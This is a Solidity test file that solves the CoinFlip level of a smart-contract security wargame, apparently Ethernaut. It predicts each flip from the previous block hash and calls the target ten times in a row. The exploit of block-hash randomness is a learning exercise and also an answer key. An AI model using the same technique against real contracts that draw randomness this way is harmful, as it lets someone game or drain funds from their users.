// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {CoinFlipFactory} from "../src/levels/03-CoinFlipFactory.sol";
import {CoinFlip} from "../src/levels/03-CoinFlip.sol";

contract CoinFlipSolution is BaseTest {
    function predictFlip() private view returns (bool){
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        return coinFlip == 1;
    }

    function solution(address payable target_) internal override{
        CoinFlip target = CoinFlip(target_);
        for (uint i = 0 ; i < 10 ; i++){
            target.flip(predictFlip());
            vm.roll(block.number+1);
        }
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new CoinFlipFactory()));
    }
}
